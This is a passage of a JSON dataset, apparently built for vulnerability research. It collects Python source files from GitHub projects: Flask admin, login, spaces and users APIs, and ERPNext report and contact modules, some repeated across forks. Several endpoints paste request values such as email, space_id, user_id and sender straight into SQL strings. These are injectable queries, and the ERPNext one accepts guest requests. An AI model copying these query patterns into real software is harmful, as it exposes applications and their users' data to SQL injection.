return [\n        {'id': tag_id, 'name': MEASURE_TAGS[tag_id]['name']}\n        for tag_id in tag_ids\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/sgosal2/tiger-boards-backend/blob/8c9e3d2e456110d6b21f4cf962f1fda3296bb86f",
        "file_path": "/apis/admins.py",
        "source": "from flask import request\nfrom flask_jwt_extended import jwt_required\nfrom flask_restplus import Namespace, Resource, fields\nfrom utilities import database_utilities\n\napi = Namespace(\"admins\", description=\"Information relating to system admins\")\n\n\n@api.route('/')\nclass Admins(Resource):\n    def get(self):\n        \"\"\" Fetch data for all admins \"\"\"\n        return database_utilities.execute_query(\"select * from admins\")\n\n    @jwt_required\n    def post(self):\n        \"\"\" Insert data for a new admin \"\"\"\n        query = f\"\"\"insert into admins values (%s);\"\"\"\n        json_data = request.get_json()\n        parameters = (json_data['email'], )\n        database_utilities.execute_query(query, parameters)\n\n\n@api.route('/<string:email>')\nclass Admin(Resource):\n    def get(self, email):\n        \"\"\" Fetch data for admin with the corresponding email \"\"\"\n        return database_utilities.execute_query(f\"\"\"select * from admins where email = '{email}'\"\"\")\n\n    @jwt_required\n    def delete(self, email):\n        \"\"\" Deletes admin with the corresponding email \"\"\"\n        return database_utilities.execute_query(f\"\"\"delete from admins where email = '{email}'\"\"\")\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/sgosal2/tiger-boards-backend/blob/8c9e3d2e456110d6b21f4cf962f1fda3296bb86f",
        "file_path": "/apis/login.py",
        "source": "from flask import request, jsonify\nfrom flask_jwt_extended import (\n    create_access_token, create_refresh_token, set_access_cookies,\n    set_refresh_cookies, jwt_refresh_token_required, get_jwt_identity\n)\nfrom flask_restplus import Namespace, Resource\nfrom utilities import database_utilities\n\napi = Namespace(\"login\", description=\"Endpoint used to obtain JWT\")\n\n\n@api.route('/')\nclass Login(Resource):\n    def post(self):\n        \"\"\" Returns JWT upon login verification \"\"\"\n        json_data = request.get_json()\n        if not json_data['email']:\n            return jsonify({\"msg\": \"Missing email\"}), 400\n\n        data = database_utilities.execute_query(\n            f\"\"\"select * from admins where email = '{json_data['email']}'\"\"\")\n        if data:\n            email = data[0]['email']\n            access_token = create_access_token(identity=email)\n            refresh_token = create_refresh_token(identity=email)\n\n            resp = jsonify({\"login\": True})\n            set_access_cookies(resp, access_token)\n            set_refresh_cookies(resp, refresh_token)\n            return resp\n        else:\n            return jsonify({\"msg\": \"User is not an admin\"})\n\n\n@api.route('/refresh')\nclass Refresh(Resource):\n    @jwt_refresh_token_required\n    def post(self):\n        current_user = get_jwt_identity()\n        access_token = create_access_token(identity=current_user)\n\n        resp = jsonify({\"refresh\": True})\n        set_access_cookies(resp, access_token)\n        return resp\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/sgosal2/tiger-boards-backend/blob/8c9e3d2e456110d6b21f4cf962f1fda3296bb86f",
        "file_path": "/apis/spaces.py",
        "source": "from flask import request\nfrom flask_jwt_extended import jwt_required\nfrom flask_restplus import Namespace, Resource, fields, reqparse\nfrom utilities import database_utilities\n\napi = Namespace(\"spaces\", description=\"Information relating to spaces\")\n\n\n@api.route('/')\nclass Spaces(Resource):\n    def get(self):\n        \"\"\" Fetch data for all spaces \"\"\"\n\n        # Parse request for parameters\n        parser = reqparse.RequestParser()\n        parser.add_argument('building_id')\n        args = parser.parse_args()\n\n        # Build query strings\n        where_query = \"WHERE building_id = %s\" if args['building_id'] else ''\n        query = f\"SELECT * FROM spaces {where_query}\"\n        parameters = (args['building_id'],)\n\n        return database_utilities.execute_query(query, parameters)\n\n    @jwt_required\n    def post(self):\n        \"\"\" Insert data for new space \"\"\"\n        query = f\"\"\"insert into spaces values (%s, %s, %s, %s, %s);\"\"\"\n        json_data = request.get_json()\n        parameters = (json_data['space_id'], json_data['building_id'],\n                      json_data['name'], json_data['capacity'],\n                      json_data['features'])\n        database_utilities.execute_query(query, parameters)\n\n\n@api.route('/<string:space_id>')\nclass Space(Resource):\n    def get(self, space_id):\n        \"\"\" Fetch data for space with the corresponding space_id \"\"\"\n        return database_utilities.execute_query(\n            f\"\"\"select * from spaces where space_id = '{space_id}'\"\"\")\n\n    @jwt_required\n    def delete(self, space_id):\n        \"\"\" Deletes space with the corresponding space_id \"\"\"\n        return database_utilities.execute_query(\n            f\"\"\"delete from spaces where space_id = %s\"\"\", (space_id, ))\n\n    @jwt_required\n    def patch(self, space_id):\n        \"\"\" Replaces information of corresponding space_id with request body \"\"\"\n        query = f\"\"\"update spaces set space_id = %s, building_id = %s, \"\"\"\n        query += f\"\"\"name = %s, capacity = %s, features = %s \"\"\"\n        query += f\"\"\"where space_id = '{space_id}'\"\"\"\n        json_data = request.get_json()\n        parameters = (json_data['space_id'], json_data['building_id'],\n                      json_data['name'], json_data['capacity'],\n                      json_data['features'])\n        database_utilities.execute_query(query, parameters)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/sgosal2/tiger-boards-backend/blob/8c9e3d2e456110d6b21f4cf962f1fda3296bb86f",
        "file_path": "/apis/users.py",
        "source": "from flask import request\nfrom flask_jwt_extended import jwt_required\nfrom flask_restplus import Namespace, Resource, fields\nfrom utilities import database_utilities\n\napi = Namespace(\"users\", description=\"Information relating to users\")\n\n\n@api.route('/')\nclass Users(Resource):\n    def get(self):\n        \"\"\" Fetch data for all users \"\"\"\n        return database_utilities.execute_query(\"select * from users\")\n\n    @jwt_required\n    def post(self):\n        \"\"\" Insert data for new users \"\"\"\n        query = f\"\"\"insert into users values (%s);\"\"\"\n        json_data = request.get_json()\n        parameters = (json_data['user_id'], )\n        database_utilities.execute_query(query, parameters)\n\n\n@api.route('/<string:user_id>')\nclass User(Resource):\n    def get(self, user_id):\n        \"\"\" Fetch data for user with corresponding user_id \"\"\"\n        return database_utilities.execute_query(f\"\"\"select * from users where user_id = '{user_id}'\"\"\")\n\n    @jwt_required\n    def delete(self, user_id):\n        \"\"\" Deletes user with the corresponding user_id \"\"\"\n        return database_utilities.execute_query(f\"\"\"delete from users where user_id = '{user_id}'\"\"\")\n\n    @jwt_required\n    def patch(self, user_id):\n        \"\"\" Replaces information of corresponding user_id with request body \"\"\"\n        query = f\"\"\"update users set user_id = %s \"\"\"\n        query += f\"\"\"where user_id = '{user_id}'\"\"\"\n        json_data = request.get_json()\n        parameters = (json_data['user_id'], )\n        database_utilities.execute_query(query, parameters)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ovresko/erpnext/blob/385e3bb28485240160cb650938f01dbda740dc8a",
        "file_path": "/erpnext/templates/utils.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# License: GNU General Public License v3. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport frappe, json\nfrom frappe import _\nfrom frappe.utils import cint, formatdate\n\n@frappe.whitelist(allow_guest=True)\ndef send_message(subject=\"Website Query\", message=\"\", sender=\"\", status=\"Open\"):\n\tfrom frappe.www.contact import send_message as website_send_message\n\tlead = customer = None\n\n\twebsite_send_message(subject, message, sender)\n\n\tcustomer = frappe.db.sql(\"\"\"select distinct dl.link_name from `tabDynamic Link` dl\n\t\tleft join `tabContact` c on dl.parent=c.name where dl.link_doctype='Customer'\n\t\tand c.email_id='{email_id}'\"\"\".format(email_id=sender))\n\n\tif not customer:\n\t\tlead = frappe.db.get_value('Lead', dict(email_id=sender))\n\t\tif not lead:\n\t\t\tnew_lead = frappe.get_doc(dict(\n\t\t\t\tdoctype='Lead',\n\t\t\t\temail_id = sender,\n\t\t\t\tlead_name = sender.split('@')[0].title()\n\t\t\t)).insert(ignore_permissions=True)\n\n\topportunity = frappe.get_doc(dict(\n\t\tdoctype ='Opportunity',\n\t\tenquiry_from = 'Customer' if customer else 'Lead',\n\t\tstatus = 'Open',\n\t\ttitle = subject,\n\t\tcontact_email = sender,\n\t\tto_discuss = message\n\t))\n\n\tif customer:\n\t\topportunity.customer = customer[0][0]\n\telif lead:\n\t\topportunity.lead = lead\n\telse:\n\t\topportunity.lead = new_lead.name\n\n\topportunity.insert(ignore_permissions=True)\n\n\tcomm = frappe.get_doc({\n\t\t\"doctype\":\"Communication\",\n\t\t\"subject\": subject,\n\t\t\"content\": message,\n\t\t\"sender\": sender,\n\t\t\"sent_or_received\": \"Received\",\n\t\t'reference_doctype': 'Opportunity',\n\t\t'reference_name': opportunity.name\n\t})\n\tcomm.insert(ignore_permissions=True)\n\n\treturn \"okay\"\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ovresko/erpnext/blob/6d2bb9126adf25ccfb9182930a15e988e6d85f72",
        "file_path": "/erpnext/hr/report/employee_leave_balance/employee_leave_balance.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# License: GNU General Public License v3. See license.txt\n\nfrom __future__ import unicode_literals\nimport frappe\nfrom frappe import _\nfrom erpnext.hr.doctype.leave_application.leave_application \\\n\timport get_leave_allocation_records, get_leave_balance_on, get_approved_leaves_for_period\n\n\ndef execute(filters=None):\n\tleave_types = frappe.db.sql_list(\"select name from `tabLeave Type` order by name asc\")\n\t\n\tcolumns = get_columns(leave_types)\n\tdata = get_data(filters, leave_types)\n\t\n\treturn columns, data\n\t\ndef get_columns(leave_types):\n\tcolumns = [\n\t\t_(\"Employee\") + \":Link/Employee:150\", \n\t\t_(\"Employee Name\") + \"::200\", \n\t\t_(\"Department\") +\"::150\"\n\t]\n\n\tfor leave_type in leave_types:\n\t\tcolumns.append(_(leave_type) + \" \" + _(\"Opening\") + \":Float:160\")\n\t\tcolumns.append(_(leave_type) + \" \" + _(\"Taken\") + \":Float:160\")\n\t\tcolumns.append(_(leave_type) + \" \" + _(\"Balance\") + \":Float:160\")\n\t\n\treturn columns\n\t\ndef get_data(filters, leave_types):\n\tuser = frappe.session.user\n\tallocation_records_based_on_to_date = get_leave_allocation_records(filters.to_date)\n\tallocation_records_based_on_from_date = get_leave_allocation_records(filters.from_date)\n\n\tactive_employees = frappe.get_all(\"Employee\", \n\t\tfilters = { \"status\": \"Active\", \"company\": filters.company}, \n\t\tfields = [\"name\", \"employee_name\", \"department\", \"user_id\"])\n\t\n\tdata = []\n\tfor employee in active_employees:\n\t\tleave_approvers = get_approvers(employee.department)\n\t\tif (len(leave_approvers) and user in leave_approvers) or (user in [\"Administrator\", employee.user_id]) or (\"HR Manager\" in frappe.get_roles(user)):\n\t\t\trow = [employee.name, employee.employee_name, employee.department]\n\n\t\t\tfor leave_type in leave_types:\n\t\t\t\t# leaves taken\n\t\t\t\tleaves_taken = get_approved_leaves_for_period(employee.name, leave_type,\n\t\t\t\t\tfilters.from_date, filters.to_date)\n\n\t\t\t\t# opening balance\n\t\t\t\topening = get_leave_balance_on(employee.name, leave_type, filters.from_date,\n\t\t\t\t\tallocation_records_based_on_from_date.get(employee.name, frappe._dict()))\n\n\t\t\t\t# closing balance\n\t\t\t\tclosing = get_leave_balance_on(employee.name, leave_type, filters.to_date,\n\t\t\t\t\tallocation_records_based_on_to_date.get(employee.name, frappe._dict()))\n\n\t\t\t\trow += [opening, leaves_taken, closing]\n\n\t\t\tdata.append(row)\n\t\t\n\treturn data\n\ndef get_approvers(department):\n\tif not department:\n\t\treturn []\n\n\tapprovers = []\n\t# get current department and all its child\n\tdepartment_details = frappe.db.get_value(\"Department\", {\"name\": department}, [\"lft\", \"rgt\"], as_dict=True)\n\tdepartment_list = frappe.db.sql(\"\"\"select name from `tabDepartment`\n\t\twhere lft >= %s and rgt <= %s order by lft desc\n\t\t\"\"\", (department_details.lft, department_details.rgt), as_list = True)\n\n\t# retrieve approvers list from current department and from its subsequent child departments\n\tfor d in department_list:\n\t\tapprovers.extend([l.leave_approver for l in frappe.db.sql(\"\"\"select approver from `tabDepartment Approver` \\\n\t\t\twhere parent = %s and parentfield = 'leave_approvers'\"\"\", (d), as_dict=True)])\n\n\treturn approvers\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ovresko/erpnext/blob/11e1c60cd3b235f3274fcc8359758b384ebe73dc",
        "file_path": "/erpnext/stock/report/inactive_items/inactive_items.py",
        "source": "# Copyright (c) 2013, Frappe Technologies Pvt. Ltd. and contributors\n# For license information, please see license.txt\n\nfrom __future__ import unicode_literals\nimport frappe\nfrom frappe.utils import getdate, add_days, today, cint\nfrom frappe import _\n\ndef execute(filters=None):\n\n\tcolumns = get_columns()\n\tdata = get_data(filters)\n\treturn columns, data\n\ndef get_columns():\n\n\tcolumns = [\n\t\t{\n\t\t\t\"fieldname\": \"territory\",\n\t\t\t\"fieldtype\": \"Link\",\n\t\t\t\"label\": _(\"Territory\"),\n\t\t\t\"options\": \"Territory\",\n\t\t\t\"width\": 100\n\t\t},\n\t\t{\n\t\t\t\"fieldname\": \"item_group\",\n\t\t\t\"fieldtype\": \"Link\",\n\t\t\t\"label\": _(\"Item Group\"),\n\t\t\t\"options\": \"Item Group\",\n\t\t\t\"width\": 150\n\t\t},\n\t\t{\n\t\t\t\"fieldname\": \"item_name\",\n\t\t\t\"fieldtype\": \"Link\",\n\t\t\t\"options\": \"Item\",\n\t\t\t\"label\": \"Item\",\n\t\t\t\"width\": 150\n\t\t},\n\t\t{\n\t\t\t\"fieldname\": \"item_name\",\n\t\t\t\"fieldtype\": \"Data\",\n\t\t\t\"label\": _(\"Item Name\"),\n\t\t\t\"width\": 150\n\t\t},\n\n\t\t{\n\t\t\t\"fieldname\": \"customer\",\n\t\t\t\"fieldtype\": \"Link\",\n\t\t\t\"label\": _(\"Customer\"),\n\t\t\t\"options\": \"Customer\",\n\t\t\t\"width\": 100\n\t\t},\n\t\t{\n\t\t\t\"fieldname\": \"last_order_date\",\n\t\t\t\"fieldtype\": \"Date\",\n\t\t\t\"label\": _(\"Last Order Date\"),\n\t\t\t\"width\": 100\n\t\t},\n\t\t{\n\t\t\t\"fieldname\": \"qty\",\n\t\t\t\"fieldtype\": \"Float\",\n\t\t\t\"label\": _(\"Quantity\"),\n\t\t\t\"width\": 100\n\t\t},\n\t\t{\n\t\t\t\"fieldname\": \"days_since_last_order\",\n\t\t\t\"fieldtype\": \"Int\",\n\t\t\t\"label\": _(\"Days Since Last Order\"),\n\t\t\t\"width\": 100\n\t\t},\n\t]\n\n\treturn columns\n\n\ndef get_data(filters):\n\n\tdata = []\n\titems = get_items(filters)\n\tsales_invoice_data = get_sales_details(filters)\n\n\tfor item in items:\n\t\tif sales_invoice_data.get(item.name):\n\t\t\titem_obj = sales_invoice_data[item.name]\n\t\t\tif item_obj.days_since_last_order > cint(filters['days']):\n\t\t\t\trow = {\n\t\t\t\t\t\"territory\": item_obj.territory,\n\t\t\t\t\t\"item_group\": item_obj.item_group,\n\t\t\t\t\t\"item\": item_obj.name,\n\t\t\t\t\t\"item_name\": item_obj.item_name,\n\t\t\t\t\t\"customer\": item_obj.customer,\n\t\t\t\t\t\"last_order_date\": item_obj.last_order_date,\n\t\t\t\t\t\"qty\": item_obj.qty,\n\t\t\t\t\t\"days_since_last_order\": item_obj.days_since_last_order\n\t\t\t\t}\n\t\t\t\tdata.append(row)\n\t\telse:\n\t\t\trow = {\n\t\t\t\t\"item_group\": item.item_group,\n\t\t\t\t\"item\": item.name,\n\t\t\t\t\"item_name\": item.item_name\n\t\t\t}\n\t\t\tdata.append(row)\n\n\treturn data\n\n\ndef get_sales_details(filters):\n\n\tdata = []\n\titem_details_map = {}\n\n\tdate_field = \"s.transaction_date\" if filters[\"based_on\"] == \"Sales Order\" else \"s.posting_date\"\n\n\tsales_data = frappe.db.sql(\"\"\"\n\t\tselect s.territory, s.customer, si.item_group, si.item_name, si.qty, {date_field} as last_order_date,\n\t\tDATEDIFF(CURDATE(), {date_field}) as days_since_last_order\n\t\tfrom `tab{doctype}` s, `tab{doctype} Item` si\n\t\twhere s.name = si.parent and s.docstatus = 1\n\t\tgroup by si.name order by days_since_last_order \"\"\"\n\t\t.format(date_field = date_field, doctype = filters['based_on']), as_dict=1)\n\n\tfor d in sales_data:\n\t\titem_details_map.setdefault(d.item_name, d)\n\n\treturn item_details_map\n\ndef get_items(filters):\n\n\tfilters_dict = {\n\t\t\"disabled\": 0,\n\t\t\"is_stock_item\": 1\n\t}\n\n\tif filters.get(\"item_group\"):\n\t\tfilters_dict.update({\n\t\t\t\"item_group\": filters[\"item_group\"]\n\t\t})\n\n\tif filters.get(\"item\"):\n\t\tfilters_dict.update({\n\t\t\t\"name\": filters[\"item\"]\n\t\t})\n\n\titems = frappe.get_all(\"Item\", fields=[\"name\", \"item_group\", \"item_name\"], filters=filters_dict, order_by=\"name\")\n\n\treturn items\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/jsukrut/msrlm_erp/blob/385e3bb28485240160cb650938f01dbda740dc8a",
        "file_path": "/erpnext/templates/utils.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# License: GNU General Public License v3. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport frappe, json\nfrom frappe import _\nfrom frappe.utils import cint, formatdate\n\n@frappe.whitelist(allow_guest=True)\ndef send_message(subject=\"Website Query\", message=\"\", sender=\"\", status=\"Open\"):\n\tfrom frappe.www.contact import send_message as website_send_message\n\tlead = customer = None\n\n\twebsite_send_message(subject, message, sender)\n\n\tcustomer = frappe.db.sql(\"\"\"select distinct dl.link_name from `tabDynamic Link` dl\n\t\tleft join `tabContact` c on dl.parent=c.name where dl.link_doctype='Customer'\n\t\tand c.email_id='{email_id}'\"\"\".format(email_id=sender))\n\n\tif not customer:\n\t\tlead = frappe.db.get_value('Lead', dict(email_id=sender))\n\t\tif not lead:\n\t\t\tnew_lead = frappe.get_doc(dict(\n\t\t\t\tdoctype='Lead',\n\t\t\t\temail_id = sender,\n\t\t\t\tlead_name = sender.split('@')[0].title()\n\t\t\t)).insert(ignore_permissions=True)\n\n\topportunity = frappe.get_doc(dict(\n\t\tdoctype ='Opportunity',\n\t\tenquiry_from = 'Customer' if customer else 'Lead',\n\t\tstatus = 'Open',\n\t\ttitle = subject,\n\t\tcontact_email = sender,\n\t\tto_discuss = message\n\t))\n\n\tif customer:\n\t\topportunity.customer = customer[0][0]\n\telif lead:\n\t\topportunity.lead = lead\n\telse:\n\t\topportunity.lead = new_lead.name\n\n\topportunity.insert(ignore_permissions=True)\n\n\tcomm = frappe.get_doc({\n\t\t\"doctype\":\"Communication\",\n\t\t\"subject\": subject,\n\t\t\"content\": message,\n\t\t\"sender\": sender,\n\t\t\"sent_or_received\": \"Received\",\n\t\t'reference_doctype': 'Opportunity',\n\t\t'reference_name': opportunity.name\n\t})\n\tcomm.insert(ignore_permissions=True)\n\n\treturn \"okay\"\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/jsukrut/msrlm_erp/blob/6d2bb9126adf25ccfb9182930a15e988e6d85f72",
        "file_path": "/erpnext/hr/report/employee_leave_balance/employee_leave_balance.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# License: GNU General Public License v3. See license.txt\n\nfrom __future__ import unicode_literals\nimport frappe\nfrom frappe import _\nfrom erpnext.hr.doctype.leave_application.leave_application \\\n\timport get_leave_allocation_records, get_leave_balance_on, get_approved_leaves_for_period\n\n\ndef execute(filters=None):\n\tleave_types = frappe.db.sql_list(\"select name from `tabLeave Type` order by name asc\")\n\t\n\tcolumns = get_columns(leave_types)\n\tdata = get_data(filters, leave_types)\n\t\n\treturn columns, data\n\t\ndef get_columns(leave_types):\n\tcolumns = [\n\t\t_(\"Employee\") + \":Link/Employee:150\", \n\t\t_(\"Employee Name\") + \"::200\", \n\t\t_(\"Department\") +\"::150\"\n\t]\n\n\tfor leave_type in leave_types:\n\t\tcolumns.append(_(leave_type) + \" \" + _(\"Opening\") + \":Float:160\")\n\t\tcolumns.append(_(leave_type) + \" \" + _(\"Taken\") + \":Float:160\")\n\t\tcolumns.append(_(leave_type) + \" \" + _(\"Balance\") + \":Float:160\")\n\t\n\treturn columns\n\t\ndef get_data(filters, leave_types):\n\tuser = frappe.session.user\n\tallocation_records_based_on_to_date = get_leave_allocation_records(filters.to_date)\n\tallocation_records_based_on_from_date = get_leave_allocation_records(filters.from_date)\n\n\tactive_employees = frappe.get_all(\"Employee\", \n\t\tfilters = { \"status\": \"Active\", \"company\": filters.company}, \n\t\tfields = [\"name\", \"employee_name\", \"department\", \"user_id\"])\n\t\n\tdata = []\n\tfor employee in active_employees:\n\t\tleave_approvers = get_approvers(employee.department)\n\t\tif (len(leave_approvers) and user in leave_approvers) or (user in [\"Administrator\", employee.user_id]) or (\"HR Manager\" in frappe.get_roles(user)):\n\t\t\trow = [employee.name, employee.employee_name, employee.department]\n\n\t\t\tfor leave_type in leave_types:\n\t\t\t\t# leaves taken\n\t\t\t\tleaves_taken = get_approved_leaves_for_period(employee.name, leave_type,\n\t\t\t\t\tfilters.from_date, filters.to_date)\n\n\t\t\t\t# opening balance\n\t\t\t\topening = get_leave_balance_on(employee.name, leave_type, filters.from_date,\n\t\t\t\t\tallocation_records_based_on_from_date.get(employee.name, frappe._dict()))\n\n\t\t\t\t# closing balance\n\t\t\t\tclosing = get_leave_balance_on(employee.name, leave_type, filters.to_date,\n\t\t\t\t\tallocation_records_based_on_to_date.get(employee.name, frappe._dict()))\n\n\t\t\t\trow += [opening, leaves_taken, closing]\n\n\t\t\tdata.append(row)\n\t\t\n\treturn data\n\ndef get_approvers(department):\n\tif not department:\n\t\treturn []\n\n\tapprovers = []\n\t# get current department and all its child\n\tdepartment_details = frappe.db.get_value(\"Department\", {\"name\": department}, [\"lft\", \"rgt\"], as_dict=True)\n\tdepartment_list = frappe.db.sql(\"\"\"select name from `tabDepartment`\n\t\twhere lft >= %s and rgt <= %s order by lft desc\n\t\t\"\"\", (department_details.lft, department_details.rgt), as_list = True)\n\n\t# retrieve approvers list from current department and from its subsequent child departments\n\tfor d in department_list:\n\t\tapprovers.extend([l.leave_approver for l in frappe.db.sql(\"\"\"select approver from `tabDepartment Approver` \\\n\t\t\twhere parent = %s and parentfield = 'leave_approvers'\"\"\", (d), as_dict=True)])\n\n\treturn approvers\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/jsukrut/msrlm_erp/blob/11e1c60cd3b235f3274fcc8359758b384ebe73dc",
        "file_path": "/erpnext/stock/report/inactive_items/inactive_items.py",
        "source": "# Copyright (c) 2013, Frappe Technologies Pvt. Ltd. and contributors\n# For license information, please see license.txt\n\nfrom __future__ import unicode_literals\nimport frappe\nfrom frappe.utils import getdate, add_days, today, cint\nfrom frappe import _\n\ndef execute(filters=None):\n\n\tcolumns = get_columns()\n\tdata = get_data(filters)\n\treturn columns, data\n\ndef get_columns():\n\n\tcolumns = [\n\t\t{\n\t\t\t\"fieldname\": \"territory\",\n\t\t\t\"fieldtype\": \"Link\",\n\t\t\t\"label\": _(\"Territory\"),\n\t\t\t\"options\": \"Territory\",\n\t\t\t\"width\": 100\n\t\t},\n\t\t{\n\t\t\t\"fieldname\": \"item_group\",\n\t\t\t\"fieldtype\": \"Link\",\n\t\t\t\"label\": _(\"Item Group\"),\n\t\t\t\"options\": \"Item Group\",\n\t\t\t\"width\": 150\n\t\t},\n\t\t{\n\t\t\t\"fieldname\": \"item_name\",\n\t\t\t\"fieldtype\": \"Link\",\n\t\t\t\"options\": \"Item\",\n\t\t\t\"label\": \"Item\",\n\t\t\t\"width\": 150\n\t\t},\n\t\t{\n\t\t\t\"fieldname\": \"item_name\",\n\t\t\t\"fieldtype\": \"Data\",\n\t\t\t\"label\": _(\"Item Name\"),\n\t\t\t\"width\": 150\n\t\t},\n\n\t\t{\n\t\t\t\"fieldname\": \"customer\",\n\t\t\t\"fieldtype\": \"Link\",\n\t\t\t\"label\": _(\"Customer\"),\n\t\t\t\"options\": \"Customer\",\n\t\t\t\"width\": 100\n\t\t},\n\t\t{\n\t\t\t\"fieldname\": \"last_order_date\",\n\t\t\t\"fieldtype\": \"Date\",\n\t\t\t\"label\": _(\"Last Order Date\"),\n\t\t\t\"width\": 100\n\t\t},\n\t\t{\n\t\t\t\"fieldname\": \"qty\",\n\t\t\t\"fieldtype\": \"Float\",\n\t\t\t\"label\": _(\"Quantity\"),\n\t\t\t\"width\": 100\n\t\t},\n\t\t{\n\t\t\t\"fieldname\": \"days_since_last_order\",\n\t\t\t\"fieldtype\": \"Int\",\n\t\t\t\"label\": _(\"Days Since Last Order\"),\n\t\t\t\"width\": 100\n\t\t},\n\t]\n\n\treturn columns\n\n\ndef get_data(filters):\n\n\tdata = []\n\titems = get_items(filters)\n\tsales_invoice_data = get_sales_details(filters)\n\n\tfor item in items:\n\t\tif sales_invoice_data.get(item.name):\n\t\t\titem_obj = sales_invoice_data[item.name]\n\t\t\tif item_obj.days_since_last_order > cint(filters['days']):\n\t\t\t\trow = {\n\t\t\t\t\t\"territory\": item_obj.territory,\n\t\t\t\t\t\"item_group\": item_obj.item_group,\n\t\t\t\t\t\"item\": item_obj.name,\n\t\t\t\t\t\"item_name\": item_obj.item_name,\n\t\t\t\t\t\"customer\": item_obj.customer,\n\t\t\t\t\t\"last_order_date\": item_obj.last_order_date,\n\t\t\t\t\t\"qty\": item_obj.qty,\n\t\t\t\t\t\"days_since_last_order\": item_obj.days_since_last_order\n\t\t\t\t}\n\t\t\t\tdata.append(row)\n\t\telse:\n\t\t\trow = {\n\t\t\t\t\"item_group\": item.item_group,\n\t\t\t\t\"item\": item.name,\n\t\t\t\t\"item_name\": item.item_name\n\t\t\t}\n\t\t\tdata.append(row)\n\n\treturn data\n\n\ndef get_sales_details(filters):\n\n\tdata = []\n\titem_details_map = {}\n\n\tdate_field = \"s.transaction_date\" if filters[\"based_on\"] == \"Sales Order\" else \"s.posting_date\"\n\n\tsales_data = frappe.db.sql(\"\"\"\n\t\tselect s.territory, s.customer, si.item_group, si.item_name, si.qty, {date_field} as last_order_date,\n\t\tDATEDIFF(CURDATE(), {date_field}) as days_since_last_order\n\t\tfrom `tab{doctype}` s, `tab{doctype} Item` si\n\t\twhere s.name = si.parent and s.docstatus = 1\n\t\tgroup by si.name order by days_since_last_order \"\"\"\n\t\t.format(date_field = date_field, doctype = filters['based_on']), as_dict=1)\n\n\tfor d in sales_data:\n\t\titem_details_map.setdefault(d.item_name, d)\n\n\treturn item_details_map\n\ndef get_items(filters):\n\n\tfilters_dict = {\n\t\t\"disabled\": 0,\n\t\t\"is_stock_item\": 1\n\t}\n\n\tif filters.get(\"item_group\"):\n\t\tfilters_dict.update({\n\t\t\t\"item_group\": filters[\"item_group\"]\n\t\t})\n\n\tif filters.get(\"item\"):\n\t\tfilters_dict.update({\n\t\t\t\"name\": filters[\"item\"]\n\t\t})\n\n\titems = frappe.get_all(\"Item\", fields=[\"name\", \"item_group\", \"item_name\"], filters=filters_dict, order_by=\"name\")\n\n\treturn items\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Denzeldeveloper/frappe-erp/blob/11e1c60cd3b235f3274fcc8359758b384ebe73dc",
        "file_path": "/erpnext/stock/report/inactive_items/inactive_items.py",
        "source": "# Copyright (c) 2013, Frappe Technologies Pvt. Ltd. and contributors\n# For license information, please see license.txt\n\nfrom __future__ import unicode_literals\nimport frappe\nfrom frappe.utils import getdate, add_days, today, cint\nfrom frappe import _\n\ndef execute(filters=None):\n\n\tcolumns = get_columns()\n\tdata = get_data(filters)\n\treturn columns, data\n\ndef get_columns():\n\n\tcolumns = [\n\t\t{\n\t\t\t\"fieldname\": \"territory\",\n\t\t\t\"fieldtype\": \"Link\",\n\t\t\t\"label\": _(\"Territory\"),\n\t\t\t\"options\": \"Territory\",\n\t\t\t\"width\": 100\n\t\t},\n\t\t{\n\t\t\t\"fieldname\": \"item_group\",\n\t\t\t\"fieldtype\": \"Link\",\n\t\t\t\"label\": _(\"Item Group\"),\n\t\t\t\"options\": \"Item Group\",\n\t\t\t\"width\": 150\n\t\t},\n\t\t{\n\t\t\t\"fieldname\": \"item_name\",\n\t\t\t\"fieldtype\": \"Link\",\n\t\t\t\"options\": \"Item\",\n\t\t\t\"label\": \"Item\",\n\t\t\t\"width\": 150\n\t\t},\n\t\t{\n\t\t\t\"fieldname\": \"item_name\",\n\t\t\t\"fieldtype\": \"Data\",\n\t\t\t\"label\": _(\"Item Name\"),\n\t\t\t\"width\": 150\n\t\t},\n\n\t\t{\n\t\t\t\"fieldname\": \"customer\",\n\t\t\t\"fieldtype\": \"Link\",\n\t\t\t\"label\": _(\"Customer\"),\n\t\t\t\"options\": \"Customer\",\n\t\t\t\"width\": 100\n\t\t},\n\t\t{\n\t\t\t\"fieldname\": \"last_order_date\",\n\t\t\t\"fieldtype\": \"Date\",\n\t\t\t\"label\": _(\"Last Order Date\"),\n\t\t\t\"width\": 100\n\t\t},\n\t\t{\n\t\t\t\"fieldname\": \"qty\",\n\t\t\t\"fieldtype\": \"Float\",\n\t\t\t\"label\": _(\"Quantity\"),\n\t\t\t\"width\": 100\n\t\t},\n\t\t{\n\t\t\t\"fieldname\": \"days_since_last_order\",\n\t\t\t\"fieldtype\": \"Int\",\n\t\t\t\"label\": _(\"Days Since Last Order\"),\n\t\t\t\"width\": 100\n\t\t},\n\t]\n\n\treturn columns\n\n\ndef get_data(filters):\n\n\tdata = []\n\titems = get_items(filters)\n\tsales_invoice_data = get_sales_details(filters)\n\n\tfor item in items:\n\t\tif sales_invoice_data.get(item.name):\n\t\t\titem_obj = sales_invoice_data[item.name]\n\t\t\tif item_obj.days_since_last_order > cint(filters['days']):\n\t\t\t\trow = {\n\t\t\t\t\t\"territory\": item_obj.territory,\n\t\t\t\t\t\"item_group\": 